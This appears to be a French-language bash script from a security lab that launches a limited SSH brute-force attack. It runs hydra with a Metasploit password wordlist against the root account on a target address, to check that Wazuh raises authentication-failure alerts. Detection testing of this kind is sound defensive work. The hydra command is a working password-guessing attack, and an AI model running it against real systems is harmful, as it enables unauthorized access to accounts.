#!/bin/bash
# ============================================================
# Scénario 1: SSH Brute Force contrôlé
# Objectif: Vérifier que Wazuh détecte et crée une alerte
# MITRE ATT&CK: T1110.001 - Brute Force: Password Guessing
# ============================================================
# USAGE: bash 01_ssh_bruteforce.sh <IP_CIBLE>
# ATTENTION: Lancer uniquement depuis Kali Linux en lab isolé !

TARGET=${1:-"192.168.1.100"}
PORT=${2:-22}

echo "[*] Scénario 1: SSH Brute Force"
echo "[*] Cible: $TARGET:$PORT"
echo "[*] MITRE: T1110.001"
echo ""

# Vérification: on est bien sur Kali
if ! command -v hydra &>/dev/null; then
    echo "[!] hydra non trouvé - installe: apt install hydra"
    exit 1
fi

# Brute force limité (5 tentatives = déclenche l'alerte Wazuh)
echo "[*] Lancement de 5 tentatives SSH..."
hydra -l root \
      -P /usr/share/wordlists/metasploit/unix_passwords.txt \
      -t 1 \
      -f \
      -V \
      ssh://$TARGET:$PORT \
      2>&1 | head -20

echo ""
echo "[+] Scénario terminé"
echo "[+] Vérifie dans Wazuh Dashboard:"
echo "    - Alerte: 'Multiple authentication failures'"
echo "    - Règle: 5710, 5712, ou 40111"
echo "    - MITRE: T1110 Brute Force"
echo "    - Cherche: Security Events > Authentication Failure"
